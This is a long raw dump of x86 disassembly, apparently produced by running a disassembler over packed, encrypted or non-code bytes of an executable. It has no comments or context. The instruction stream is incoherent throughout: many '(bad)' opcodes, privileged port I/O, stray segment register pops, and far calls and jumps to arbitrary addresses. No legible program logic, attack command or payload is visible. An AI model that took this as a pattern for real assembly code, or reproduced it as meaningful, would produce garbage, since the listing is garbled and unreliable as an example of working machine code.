  41314d:	mov    esi,0xf2369569
  413152:	ss jge 0x413176
  413155:	retf   
  413156:	inc    edi
  413157:	push   ss
  413158:	xchg   ebx,eax
  413159:	lods   al,BYTE PTR ds:[esi]
  41315a:	retf   
  41315b:	add    BYTE PTR [eax-0xd],dh
  41315e:	mov    DWORD PTR [edi],esp
  413160:	pop    ss
  413161:	ins    DWORD PTR es:[edi],dx
  413162:	dec    esi
  413163:	sub    ch,BYTE PTR [esi+ebp*2+0x7d]
  413167:	pop    ebx
  413168:	add    DWORD PTR [edi+edx*4+0x55e83ea5],ebx
  41316f:	push   es
  413170:	test   dh,dh
  413172:	cld    
  413173:	mov    ds:0x6ccde9cd,al
  413178:	mov    eax,DWORD PTR ds:0x5ce0405f
  41317e:	rdtsc  
  413180:	mov    ah,BYTE PTR [eax]
  413182:	adc    ecx,DWORD PTR [ebx]
  413184:	mov    bl,0x14
  413186:	jae    0x413150
  413188:	scas   eax,DWORD PTR es:[edi]
  413189:	xchg   esi,eax
  41318a:	bound  ebx,QWORD PTR [ebp-0x2c234b0a]
  413190:	(bad)  
  413191:	pusha  
  413192:	test   ebx,edx
  413194:	fwait
  413195:	(bad)
  413198:	mov    ch,0x8f
  41319a:	mov    edi,0x7f3b3357
  41319f:	jmp    0x41318d
  4131a1:	fwait
  4131a2:	add    eax,0xd66aedeb
  4131a7:	dec    eax
  4131a8:	push   es
  4131a9:	add    bh,al
  4131ab:	sbb    BYTE PTR [ecx+0x7f],bl
  4131ae:	sub    DWORD PTR [eax+0x22],edx
  4131b1:	outs   dx,BYTE PTR ds:[esi]
  4131b2:	mov    edi,0x61d280fe
  4131b7:	lock mov edi,0xae4ab8d7
  4131bd:	fbstp  TBYTE PTR ds:0xc253a70d
  4131c3:	stos   DWORD PTR es:[edi],eax
  4131c4:	push   ebx
  4131c5:	add    eax,DWORD PTR [ecx]
  4131c7:	out    dx,eax
  4131c8:	in     al,dx
  4131c9:	cmp    DWORD PTR [eax],edx
  4131cb:	add    cl,dh
  4131cd:	push   cs
  4131ce:	ficomp DWORD PTR [edx-0x21]
  4131d1:	xor    eax,edx
  4131d3:	loopne 0x41315f
  4131d5:	rcr    ecx,1
  4131d7:	shl    eax,1
  4131d9:	ret    
  4131da:	pop    esp
  4131db:	aad    0x8a
  4131dd:	shl    BYTE PTR [ebp+0x40],1
  4131e0:	jne    0x413208
  4131e2:	(bad)  
  4131e3:	cmp    cl,BYTE PTR [ebp+0x20]
  4131e6:	pop    ss
  4131e7:	int    0x88
  4131e9:	imul   ebx,DWORD PTR [edi-0xf],0xe769ed4c
  4131f0:	inc    eax
  4131f1:	jg     0x41318b
  4131f3:	call   0x94be:0x2fc6448c
  4131fa:	addr16 inc ebp
  4131fc:	call   DWORD PTR [edi]
  4131fe:	mov    ah,0xa1
  413200:	jne    0x413183
  413202:	and    eax,0x31648faf
  413207:	(bad)  
  413208:	pop    ss
  413209:	ss call 0xd1dc17f3
  41320f:	xchg   DWORD PTR [eax+ebp*1-0x55e511e6],eax
  413216:	rcr    ch,1
  413218:	mov    eax,0x11815e43
  41321d:	sub    eax,0xc65c6346
  413222:	bound  ebx,QWORD PTR [edi-0x17063fb]
  413228:	ins    DWORD PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	stos   BYTE PTR es:[edi],al
  41322b:	add    eax,0x71d5e0c
  413230:	xchg   edi,eax
  413231:	mov    esp,0xfa1adbb9
  413236:	push   edi
  413237:	das    
  413238:	add    dl,ah
  41323a:	daa    
  41323b:	mov    ebp,0x7b36ba6f
  413240:	icebp  
  413241:	mov    ds:0x669b3ee4,al
  413246:	pop    eax
  413247:	sbb    ah,BYTE PTR ds:0x5e4e152c
  41324d:	or     al,0xf3
  41324f:	push   edi
  413250:	jne    0x413213
  413252:	jae    0x413204
  413254:	loopne 0x41321d
  413256:	idiv   bh
  413258:	(bad)  
  413259:	int    0x96
  41325b:	test   ecx,ebp
  41325d:	popa   
  41325e:	mov    ebp,0xe17a6883
  413263:	mov    ah,0xd2
  413265:	loopne 0x41328b
  413267:	push   eax
  413268:	mov    al,0x8a
  41326a:	pop    ecx
  41326b:	mov    ecx,esp
  41326d:	les    edi,FWORD PTR [edi]
  41326f:	cmp    eax,0xa26144ba
  413274:	lahf   
  413275:	fdivr  st,st(6)
  413277:	inc    edi
  413278:	xchg   ebp,eax
  413279:	or     esi,DWORD PTR [ecx*2-0x2ca4eabb]
  413280:	mov    edi,0x1d54af5b
  413285:	arpl   WORD PTR ds:0xb36407a7,bx
  41328b:	cld    
  41328c:	push   cs
  41328d:	aaa    
  41328e:	ins    DWORD PTR es:[edi],dx
  41328f:	stos   BYTE PTR es:[edi],al
  413290:	fcmovnu st,st(4)
  413292:	call   0x49f6:0x8e7e6fad
  413299:	inc    ebx
  41329a:	hlt    
  41329b:	je     0x4132d2
  41329d:	xchg   edx,eax
  41329e:	aam    0x8e
  4132a0:	cli    
  4132a1:	push   0xe56b5466
  4132a6:	fadd   DWORD PTR [edi+0x7a236e1c]
  4132ac:	cli    
  4132ad:	mov    cl,0x17
  4132af:	dec    esp
  4132b0:	push   cs
  4132b1:	pop    ebp
  4132b2:	pop    esp
  4132b3:	xor    dh,0xe3
  4132b6:	inc    eax
  4132b7:	inc    esp
  4132b8:	dec    ecx
  4132b9:	mov    edx,0x26c8cd85
  4132be:	pop    esi
  4132bf:	inc    esi
  4132c0:	pop    edx
  4132c1:	jo     0x4132b3
  4132c3:	(bad)  
  4132c4:	in     eax,0x15
  4132c6:	and    edx,DWORD PTR [esi+0x78]
  4132c9:	xchg   esp,eax
  4132ca:	fst    st(4)
  4132cc:	(bad)  
  4132cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132cf:	pop    es
  4132d0:	sbb    esi,DWORD PTR [edx+eax*2+0x3e]
  4132d4:	pop    es
  4132d5:	test   edi,edi
  4132d7:	into   
  4132d8:	sub    DWORD PTR [eax],0xfafbcbc4
  4132de:	int3   
  4132df:	in     al,0xf4
  4132e1:	and    eax,0xe7bd4b75
  4132e6:	imul   eax,DWORD PTR [edx],0xffffff8b
  4132e9:	cdq    
  4132ea:	inc    esi
  4132eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ec:	lock sbb DWORD PTR [esi-0x41],ecx
  4132f0:	daa    
  4132f1:	mov    ss,ecx
  4132f3:	popa   
  4132f4:	or     eax,0x3fa54229
  4132f9:	mov    edi,0x7df4acc1
  4132fe:	aas    
  4132ff:	ret    
  413300:	fprem1 
  413302:	mov    ds:0xa280f01b,al
  413307:	sbb    al,0x87
  413309:	and    al,al
  41330b:	loop   0x413327
  41330d:	mov    cl,0x2e
  41330f:	repnz stc 
  413311:	xchg   esp,eax
  413312:	pushf  
  413313:	pop    es
  413314:	out    0x48,eax
  413316:	mov    edx,0x8e6f5212
  41331b:	sbb    al,0xce
  41331d:	xor    edi,DWORD PTR [ebx+0x373256d4]
  413323:	mul    DWORD PTR [ecx-0x2250042d]
  413329:	or     ah,BYTE PTR [eax+0x48]
  41332c:	xlat   BYTE PTR ds:[ebx]
  41332d:	imul   edi,DWORD PTR [edx-0x4ed965c9],0xffffffe5
  413334:	shr    dl,0xb3
  413337:	mov    es,esi
  413339:	add    ebp,DWORD PTR [ebx+esi*1-0x31]
  41333d:	add    BYTE PTR [ebx-0x6b],dh
  413340:	es dec edi
  413342:	jae    0x413395
  413344:	js     0x4133b5
  413346:	sbb    DWORD PTR [esi-0x79],edx
  413349:	dec    ebx
  41334a:	(bad)
  41334d:	ds and ecx,esi
  413350:	es dec ecx
  413352:	sub    BYTE PTR [edi+0x6f01deaf],bh
  413358:	jle    0x4133b0
  41335a:	jnp    0x413369
  41335c:	adc    ch,BYTE PTR [ebx+0x1c156740]
  413362:	cmp    DWORD PTR [esi+0x1b],0xa7e07478
  413369:	ins    BYTE PTR es:[edi],dx
  41336a:	mov    ebp,0x83eb2f7
  41336f:	mov    edx,0x28ef350b
  413374:	stos   DWORD PTR es:[edi],eax
  413375:	int    0x78
  413377:	mov    bh,BYTE PTR [edi+0x31]
  41337a:	out    dx,eax
  41337b:	mov    dh,0x23
  41337d:	outs   dx,DWORD PTR ds:[esi]
  41337e:	sahf   
  41337f:	add    DWORD PTR [ecx-0x4c6f4a49],eax
  413385:	add    al,0x34
  413387:	ja     0x413329
  413389:	rcr    BYTE PTR [eax+0x31],cl
  41338c:	lods   al,BYTE PTR ds:[esi]
  41338d:	dec    esp
  41338e:	sbb    al,0xae
  413390:	jp     0x4133e4
  413392:	outs   dx,DWORD PTR ds:[esi]
  413393:	mov    bh,0x62
  413395:	data16 mov al,0xfb
  413398:	test   eax,0x84224dae
  41339d:	push   ebp
  41339e:	aaa    
  41339f:	cli    
  4133a0:	(bad)  
  4133a1:	cmp    dh,BYTE PTR [ebp+0x34]
  4133a4:	mov    edx,0x1acf6771
  4133a9:	test   BYTE PTR [esi-0x23],dl
  4133ac:	push   ecx
  4133ad:	adc    BYTE PTR [eax],ch
  4133af:	rol    DWORD PTR [edx-0x103d1716],0x9f
  4133b6:	dec    ecx
  4133b7:	push   ds
  4133b8:	pop    es
  4133b9:	icebp  
  4133ba:	mov    ds:0xc2200ef1,al
  4133bf:	ins    DWORD PTR es:[edi],dx
  4133c0:	add    DWORD PTR [edi-0x2b],ebp
  4133c3:	inc    ebp
  4133c4:	ds iret 
  4133c6:	jmp    0xfafc845a
  4133cb:	or     al,0xe3
  4133cd:	mov    al,0xa9
  4133cf:	cmp    al,0x8d
  4133d1:	jb     0x413447
  4133d3:	push   ds
  4133d4:	jnp    0x41336e
  4133d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d7:	pop    ebx
  4133d8:	ins    BYTE PTR es:[edi],dx
  4133d9:	test   bl,dh
  4133db:	enter  0x63cb,0xa
  4133df:	push   edx
  4133e0:	fldenv ds:0x68dfbc8c
  4133e6:	nop
  4133e7:	push   0x5e4af550
  4133ec:	jp     0x41346b
  4133ee:	inc    esp
  4133ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f0:	lahf   
  4133f1:	mov    ecx,0x8e70bb84
  4133f6:	mov    eax,edi
  4133f8:	clc    
  4133f9:	jo     0x4133b4
  4133fb:	and    BYTE PTR [eax+esi*4+0x1d],dh
  4133ff:	js     0x4133d0
  413401:	add    ah,0x1f
  413404:	cdq    
  413405:	adc    DWORD PTR [ebx],esi
  413407:	mov    bh,0x83
  413409:	inc    eax
  41340a:	and    al,0x82
  41340c:	in     al,dx
  41340d:	push   edx
  41340e:	in     al,dx
  41340f:	mov    BYTE PTR [eax+edx*8],ah
  413412:	xchg   ebp,eax
  413413:	sub    BYTE PTR [edi],ah
  413415:	xchg   edi,eax
  413416:	sbb    BYTE PTR [edx+0x7a248044],dl
  41341c:	adc    bh,BYTE PTR [ebx+0x2d]
  41341f:	arpl   WORD PTR [edi+ebp*8+0x2d],bx
  413423:	(bad)  
  413424:	xchg   ecx,eax
  413425:	nop
  413426:	xchg   edi,esp
  413428:	bound  edi,QWORD PTR [edi-0x58]
  41342b:	shl    BYTE PTR [ebx],1
  41342d:	mov    edx,0x5dc20431
  413432:	cli    
  413433:	test   BYTE PTR [ebx],al
  413435:	fcom   QWORD PTR [edx+0x2ef801f9]
  41343b:	imul   ecx,edx,0x4e787384
  413441:	retf   
  413442:	ds xor eax,0xd618e479
  413448:	push   0xfffffffb
  41344a:	pop    ebx
  41344b:	cmp    DWORD PTR [edi+0xe53dd8f],edx
  413451:	and    al,BYTE PTR [ecx+0x1e]
  413454:	pop    eax
  413455:	cmp    al,0x55
  413457:	mov    dl,0x34
  413459:	pusha  
  41345a:	aad    0xef
  41345c:	mov    al,cl
  41345e:	mov    ebp,0x889624f9
  413463:	xchg   ebp,eax
  413464:	dec    ebp
  413465:	or     al,cl
  413467:	into   
  413468:	lea    eax,[esp+esi*8]
  41346b:	sub    BYTE PTR [ebp-0x7],0xa5
  41346f:	adc    BYTE PTR [edi-0x169dcaf6],0x12
  413476:	sbb    DWORD PTR [esi+0x75],ebp
  413479:	push   es
  41347a:	shl    cl,cl
  41347c:	imul   esp,eax,0x656177a1
  413482:	sar    DWORD PTR [ebx-0x2d],1
  413485:	aas    
  413486:	jge    0x41346d
  413488:	in     al,dx
  413489:	pop    ebx
  41348a:	mov    ecx,0x5ac1cb5c
  41348f:	pop    ecx
  413490:	cmc    
  413491:	clc    
  413492:	pop    esi
  413493:	pop    ecx
  413494:	stos   BYTE PTR es:[edi],al
  413495:	push   es
  413496:	nop
  413497:	fwait
  413498:	xchg   edx,eax
  413499:	pop    ebp
  41349a:	std    
  41349b:	or     BYTE PTR [ebx+0x2e],ah
  41349e:	fiadd  WORD PTR [ebx+0x2230bd82]
  4134a4:	pop    ds
  4134a5:	mov    ch,0x61
  4134a7:	pop    ds
  4134a8:	shl    BYTE PTR [edx],0xdf
  4134ab:	adc    bh,BYTE PTR [edx]
  4134ad:	inc    edx
  4134ae:	mov    esp,0x7ae01759
  4134b3:	jns    0x4134f2
  4134b5:	in     al,0xee
  4134b7:	adc    eax,0x8a5735b3
  4134bc:	add    dl,BYTE PTR [eax+0x79c1f1e3]
  4134c2:	sbb    DWORD PTR [eax-0x3],ecx
  4134c5:	lods   al,BYTE PTR ds:[esi]
  4134c6:	xchg   esp,eax
  4134c7:	es ret 0x27e1
  4134cb:	stos   WORD PTR es:[edi],ax
  4134cd:	or     al,0x79
  4134cf:	mov    edi,0xd1dc632d
  4134d4:	sbb    cl,ch
  4134d6:	mov    ebp,0x212c6afe
  4134db:	aaa    
  4134dc:	xor    cl,cl
  4134de:	or     al,0xa3
  4134e0:	push   eax
  4134e1:	pop    ss
  4134e2:	jmp    0x87b3:0x89173e99
  4134e9:	aam    0xfa
  4134eb:	mov    dh,0x49
  4134ed:	or     esi,DWORD PTR [edi+0x5669177a]
  4134f3:	scas   eax,DWORD PTR es:[edi]
  4134f4:	int    0x78
  4134f6:	jno    0x4134b6
  4134f8:	lods   al,BYTE PTR ds:[esi]
  4134f9:	icebp  
  4134fa:	dec    ebp
  4134fb:	imul   esp,DWORD PTR [ecx-0x4b6b0399],0x21
  413502:	push   ebp
  413503:	out    0xdd,al
  413505:	fcomp  st(4)
  413507:	adc    al,0x8
  413509:	(bad)  
  41350a:	mov    esi,esp
  41350c:	cwde   
  41350d:	or     BYTE PTR [ebp-0x4f],al
  413510:	das    
  413511:	div    DWORD PTR [esi]
  413513:	pop    ebp
  413514:	enter  0x9c95,0xee
  413518:	fwait
  413519:	les    esi,FWORD PTR [ebp+0x2a]
  41351c:	ror    esp,1
  41351e:	dec    esi
  41351f:	adc    dh,BYTE PTR ds:0xc58341cc
  413525:	(bad)  
  413527:	popf   
  413528:	in     al,0xe4
  41352a:	inc    ebx
  41352b:	nop
  41352c:	xor    al,0x2e
  41352e:	in     al,0xe8
  413530:	push   ds
  413531:	fbstp  TBYTE PTR [edx-0x4b0be078]
  413537:	mov    ?,WORD PTR [ecx-0x5085bed1]
  41353d:	cmp    ah,BYTE PTR [ebp-0xb7a7b47]
  413543:	daa    
  413544:	jg     0x41352d
  413546:	dec    edx
  413547:	(bad)  
  413548:	(bad)  
  413549:	fnstenv [edi+edx*4]
  41354c:	inc    ebp
  41354d:	xlat   BYTE PTR ds:[ebx]
  41354e:	pop    ecx
  41354f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413550:	cmp    edx,DWORD PTR [ebx-0x5c]
  413553:	shl    BYTE PTR [ecx],0x9f
  413556:	(bad)  
  413557:	test   eax,0x8ce42161
  41355c:	in     eax,dx
  41355d:	adc    cl,al
  41355f:	adc    ebp,DWORD PTR [eax-0x24]
  413562:	pushf  
  413563:	nop
  413564:	ret    0xdbe1
  413567:	sub    DWORD PTR [edi+0x37],esp
  41356a:	jnp    0x413515
  41356c:	sbb    ebx,DWORD PTR [edi]
  41356e:	dec    edi
  41356f:	stos   BYTE PTR es:[edi],al
  413570:	adc    al,0xc3
  413572:	jbe    0x413523
  413574:	fcomip st,st(5)
  413576:	mov    ds:0x68d473c1,eax
  41357b:	sbb    BYTE PTR [edi-0x34ce022e],bh
  413581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413582:	rol    ch,cl
  413584:	jle    0x4135da
  413586:	outs   dx,DWORD PTR ds:[esi]
  413587:	ins    DWORD PTR es:[edi],dx
  413588:	cld    
  413589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41358a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41358b:	js     0x4135db
  41358d:	in     al,dx
  41358e:	fsubp  st(0),st
  413590:	lods   eax,DWORD PTR ds:[esi]
  413591:	push   0xffffff96
  413593:	cmp    ebx,DWORD PTR [ebx+eiz*2+0x6]
  413597:	sbb    bl,cl
  413599:	pop    ebp
  41359a:	and    BYTE PTR [edx+0x64],0x1
  41359e:	xor    al,0x37
  4135a0:	lods   eax,DWORD PTR ds:[esi]
  4135a1:	dec    esi
  4135a2:	fcom   st(4)
  4135a4:	xchg   edi,eax
  4135a5:	mov    ebx,0xec9c7be0
  4135aa:	mov    eax,ds:0xf8733441
  4135af:	ret    
  4135b0:	mov    eax,ds:0x7e69241a
  4135b5:	fst    DWORD PTR [ebx+ebx*8-0x3c]
  4135b9:	pop    es
  4135ba:	mov    ch,ah
  4135bc:	jmp    0x4135b8
  4135be:	xor    DWORD PTR [ecx+ebp*8],ebp
  4135c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c2:	mov    ecx,0x3ebc52ff
  4135c7:	pop    edi
  4135c8:	xchg   ebp,eax
  4135c9:	cmp    eax,0x1a9cbeba
  4135ce:	fidivr DWORD PTR [edi+0x2c]
  4135d1:	out    0x0,al
  4135d3:	jge    0x413644
  4135d5:	sbb    BYTE PTR [ebx+0x516b9a13],cl
  4135db:	jmp    0x41359b
  4135dd:	out    dx,eax
  4135de:	ss pop es
  4135e0:	into   
  4135e1:	push   cs
  4135e2:	xchg   ecx,eax
  4135e3:	inc    edi
  4135e4:	pop    es
  4135e5:	mov    ds:0x384a4301,eax
  4135ea:	dec    eax
  4135eb:	dec    eax
  4135ec:	mov    esp,0x8d88dead
  4135f1:	xchg   edi,eax
  4135f2:	test   al,0xa3
  4135f4:	repnz and BYTE PTR [esi+0x39],ah
  4135f8:	adc    cl,BYTE PTR [eax+0x7c]
  4135fb:	mov    ah,0x3e
  4135fd:	aam    0x7e
  4135ff:	sbb    dl,BYTE PTR [eax+0x57361a94]
  413605:	push   esp
  413606:	jb     0x41366b
  413608:	scas   eax,DWORD PTR es:[edi]
  413609:	push   edx
  41360a:	daa    
  41360b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41360c:	xor    ebp,DWORD PTR [ebp+0x551a12e0]
  413612:	mov    dl,0xe3
  413614:	(bad)  
  413615:	or     eax,0x950b041d
  41361a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41361b:	imul   eax,DWORD PTR [ebp+0x56],0xffffffa5
  41361f:	dec    ebp
  413620:	ins    DWORD PTR es:[edi],dx
  413621:	and    cl,bh
  413623:	outs   dx,BYTE PTR ds:[esi]
  413624:	push   esi
  413625:	mov    al,BYTE PTR [ebx+0x584b0403]
  41362b:	repnz pop es
  41362d:	sahf   
  41362e:	mov    ebx,0xc7ac94c0
  413633:	mov    BYTE PTR [ebp-0x18],cl
  413636:	pop    es
  413637:	jmp    0x4135f0
  413639:	cmc    
  41363a:	xchg   esi,eax
  41363b:	and    bl,al
  41363d:	pusha  
  41363e:	fidiv  DWORD PTR ds:0xde0e766d
  413644:	add    edi,esi
  413646:	sahf   
  413647:	ds sub eax,0xf5f51d0b
  41364d:	hlt    
  41364e:	scas   al,BYTE PTR es:[edi]
  41364f:	outs   dx,BYTE PTR ds:[esi]
  413650:	aas    
  413651:	je     0x413616
  413653:	adc    DWORD PTR [eax+0xe6eeef7],0x6fcb4d4
  41365d:	mov    ebx,0x973ccd76
  413662:	ins    BYTE PTR es:[edi],dx
  413663:	or     eax,0xb52305ab
  413668:	xor    esi,DWORD PTR [ecx+0x38]
  41366b:	xchg   esi,eax
  41366c:	ret    
  41366d:	fs inc edx
  41366f:	(bad)  
  413670:	in     eax,0xc9
  413672:	adc    al,0x60
  413674:	cmp    BYTE PTR [edi-0x4a61ac83],0x44
  41367b:	rcl    BYTE PTR [ecx],1
  41367d:	xlat   BYTE PTR ds:[ebx]
  41367e:	loope  0x4136c7
  413680:	mov    bl,0x2d
  413682:	mov    ch,0xe7
  413684:	shl    DWORD PTR [esi+0x48],cl
  413687:	sub    ah,BYTE PTR [ecx]
  413689:	or     al,0xc3
  41368b:	into   
  41368c:	nop
  41368d:	dec    eax
  41368e:	mov    ecx,0x588be663
  413693:	mov    esp,0x464e9f55
  413698:	mov    esi,0xf91d4644
  41369d:	ss ins DWORD PTR es:[edi],dx
  41369f:	cld    
  4136a0:	shl    DWORD PTR ds:0x418cd379,0x52
  4136a7:	out    0xa,eax
  4136a9:	shr    BYTE PTR [ebp-0x186edf33],0x6a
  4136b0:	out    dx,al
  4136b1:	pop    ecx
  4136b2:	pop    ebp
  4136b3:	mov    ds:0xa9f8ce60,al
  4136b8:	mov    dh,0x4d
  4136ba:	dec    ebp
  4136bb:	mov    esp,edi
  4136bd:	push   esi
  4136be:	push   es
  4136bf:	adc    edx,DWORD PTR [ebp+0x18]
  4136c2:	(bad)  
  4136c3:	adc    al,0xa
  4136c5:	rcl    DWORD PTR [edx+0x25],1
  4136c8:	sbb    dh,cl
  4136ca:	imul   esi,esp,0x5ab9fd3a
  4136d0:	(bad)  
  4136d1:	out    dx,al
  4136d2:	test   DWORD PTR [edi],ebx
  4136d4:	pop    eax
  4136d5:	sti    
  4136d6:	pop    esp
  4136d7:	mov    cl,0x52
  4136d9:	imul   edi
  4136db:	add    al,dl
  4136dd:	jmp    0xab5a867c
  4136e2:	push   ebx
  4136e3:	test   al,0x68
  4136e5:	dec    eax
  4136e6:	add    ebp,eax
  4136e8:	es push esp
  4136ea:	pop    edx
  4136eb:	ds jge 0x41370c
  4136ee:	adc    al,0x7a
  4136f0:	ja     0x4136c1
  4136f2:	xchg   ebx,eax
  4136f3:	mov    cl,0x4
  4136f5:	std    
  4136f6:	dec    eax
  4136f7:	jecxz  0x4136ab
  4136f9:	fsubr  QWORD PTR [esi]
  4136fb:	sbb    al,0x97
  4136fd:	adc    DWORD PTR [esi+0x1c0c6947],ecx
  413703:	push   0xffffff9a
  413705:	aas    
  413706:	xor    al,ch
  413708:	jp     0x4136d5
  41370a:	and    BYTE PTR [ecx+0x3a31f12c],ah
  413710:	out    0x17,al
  413712:	add    esi,DWORD PTR [ebp+0x806d21e]
  413718:	lock mov bl,0xfd
  41371b:	push   0xffffff94
  41371d:	push   DWORD PTR [edi+edi*2+0x5d]
  413721:	inc    esi
  413722:	(bad)  
  413723:	or     DWORD PTR [ebx-0x44],ecx
  413726:	mov    edx,0x799dfe09
  41372b:	mov    eax,ds:0xbb8d0a55
  413730:	sub    cl,BYTE PTR [edi-0x1e]
  413733:	adc    DWORD PTR [ebx+0x14],esp
  413736:	cmp    eax,0x63643060
  41373b:	adc    al,0x1
  41373d:	adc    eax,DWORD PTR [edx]
  41373f:	call   0xc73f24f
  413744:	dec    eax
  413745:	pop    ecx
  413746:	xchg   esp,eax
  413747:	inc    ebp
  413748:	push   esi
  413749:	sub    DWORD PTR [eax-0x4f1cd79],edi
  41374f:	jo     0x413703
  413751:	xchg   ecx,eax
  413752:	in     al,dx
  413753:	or     edx,ebp
  413755:	jae    0x4137cd
  413757:	add    BYTE PTR [ebp-0x44eeb214],bl
  41375d:	ss xchg cl,dh
  413760:	xor    DWORD PTR [ebx+0x51],ebp
  413763:	xchg   edi,eax
  413764:	aad    0x5a
  413766:	ror    DWORD PTR [ebx+0x56126f6a],cl
  41376c:	cmp    edi,DWORD PTR [edx]
  41376e:	stos   BYTE PTR es:[edi],al
  41376f:	mov    BYTE PTR [ecx],ch
  413771:	add    DWORD PTR [eax+0x4e],ecx
  413774:	pop    ds
  413775:	clc    
  413776:	sub    ah,ch
  413778:	outs   dx,BYTE PTR ds:[esi]
  41377a:	cmp    esi,ebp
  41377c:	mov    ds:0x3ffe7e17,al
  413781:	arpl   WORD PTR [edx],si
  413783:	pop    ebx
  413784:	add    dh,dh
  413786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413787:	cmc    
  413788:	cmp    cl,BYTE PTR ss:[eax]
  41378b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41378c:	sbb    eax,0xe26ea564
  413791:	pushf  
  413792:	dec    eax
  413793:	shr    BYTE PTR [ebp-0x39],cl
  413796:	and    eax,0xa01cf7a8
  41379b:	stos   DWORD PTR es:[edi],eax
  41379c:	push   cs
  41379d:	sti    
  41379e:	cmp    al,0x1e
  4137a0:	(bad)  
  4137a1:	shl    BYTE PTR [ebx-0x2b244b47],1
  4137a7:	dec    ebx
  4137a8:	pop    eax
  4137a9:	xor    eax,0x9a2934a6
  4137ae:	pop    esp
  4137af:	push   esi
  4137b0:	ret    0xa2df
  4137b3:	popf   
  4137b4:	xchg   ecx,eax
  4137b5:	(bad)  
  4137b6:	jp     0x413779
  4137b8:	and    ch,BYTE PTR [eax]
  4137ba:	in     eax,0x81
  4137bc:	add    bl,bh
  4137be:	retf   0xf89
  4137c1:	(bad)  
  4137c3:	call   0x15663b93
  4137c8:	shl    DWORD PTR [ebx],cl
  4137ca:	out    0x7f,al
  4137cc:	mov    ecx,0x64a9e3b8
  4137d1:	push   eax
  4137d2:	xchg   esi,eax
  4137d3:	mov    WORD PTR [edi],?
  4137d5:	loop   0x413788
  4137d7:	pop    ecx
  4137d8:	sbb    al,BYTE PTR [edx+0x37]
  4137db:	xor    BYTE PTR [ebx+0x17],0x38
  4137df:	inc    edx
  4137e0:	arpl   si,sp
  4137e2:	push   ebp
  4137e3:	stos   BYTE PTR es:[edi],al
  4137e4:	xchg   esp,eax
  4137e5:	clc    
  4137e6:	and    al,al
  4137e8:	lods   al,BYTE PTR ds:[esi]
  4137e9:	jmp    0x1712244
  4137ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ef:	pop    ecx
  4137f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f1:	lea    ebx,[edx+0x62aecca2]
  4137f7:	and    edx,DWORD PTR [esi-0x78]
  4137fa:	je     0x41382c
  4137fc:	scas   eax,DWORD PTR es:[edi]
  4137fd:	add    al,0x98
  4137ff:	cwde   
  413800:	imul   ebx,DWORD PTR [ebx],0x14
  413803:	out    dx,al
  413804:	in     al,0x41
  413806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413807:	pop    edi
  413808:	sub    eax,0x6c51ea61
  41380d:	mov    eax,0xe104c83a
  413812:	aam    0x1
  413814:	sub    al,0x3b
  413816:	cmp    BYTE PTR [edi+0x3f127c7f],al
  41381c:	(bad)  
  41381d:	xchg   ebp,eax
  41381e:	ds pop edi
  413820:	nop
  413821:	ds push ebp
  413823:	jl     0x41384c
  413825:	mov    ch,0x4b
  413827:	mov    esi,0xd7065fbe
  41382c:	xchg   WORD PTR [edx-0x4f],ax
  413830:	jecxz  0x413853
  413832:	pop    ecx
  413833:	int    0xa4
  413835:	dec    eax
  413836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413837:	adc    BYTE PTR [edi-0x11],al
  41383a:	aad    0xcf
  41383c:	xor    DWORD PTR [ebp-0x49],ebp
  41383f:	inc    ebx
  413840:	xchg   edx,eax
  413841:	xchg   ebx,eax
  413842:	nop
  413843:	adc    DWORD PTR [ecx-0x688f32b7],esp
  413849:	ds ds addr16 cmp eax,0xad6c0ab2
  413851:	dec    ebx
  413852:	xchg   edx,eax
  413853:	cli    
  413854:	das    
  413855:	or     esi,edi
  413857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413858:	int3   
  413859:	cmp    BYTE PTR [eax-0x56445d0a],ch
  41385f:	out    dx,al
  413860:	xchg   bl,dh
  413862:	das    
  413863:	push   edi
  413864:	fisub  WORD PTR [esi-0x69c18339]
  41386a:	adc    DWORD PTR [esi+0x61],ecx
  41386d:	inc    edi
  41386e:	call   0x9b7c:0x24aba0ef
  413875:	int3   
  413876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413877:	fs ret 0xb9f7
  41387b:	js     0x413882
  41387d:	or     dl,bl
  41387f:	stos   BYTE PTR es:[edi],al
  413880:	popa   
  413881:	dec    ebp
  413882:	rcl    DWORD PTR ds:0xf2faf11f,1
  413888:	pop    ebp
  413889:	popa   
  41388a:	arpl   dx,cx
  41388c:	inc    esp
  41388d:	mov    esp,0xfb0a351e
  413892:	shl    edi,0xb6
  413895:	je     0x41385d
  413897:	mov    ecx,0xde79a9d7
  41389c:	pop    eax
  41389d:	or     eax,0xb8f47a6e
  4138a2:	xchg   edi,eax
  4138a3:	push   cs
  4138a4:	dec    eax
  4138a5:	loop   0x413876
  4138a7:	js     0x41386e
  4138a9:	sub    DWORD PTR [edi+0x5],0x7abaf73d
  4138b0:	std    
  4138b1:	jecxz  0x4138f9
  4138b3:	xchg   esp,eax
  4138b4:	outs   dx,BYTE PTR ds:[esi]
  4138b5:	out    dx,eax
  4138b6:	lock jnp 0x4138a1
  4138b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ba:	(bad)  
  4138bb:	out    dx,eax
  4138bc:	imul   DWORD PTR ds:0x6b20907b
  4138c2:	mov    ah,dh
  4138c4:	add    BYTE PTR [ebp+0x14c0f06c],al
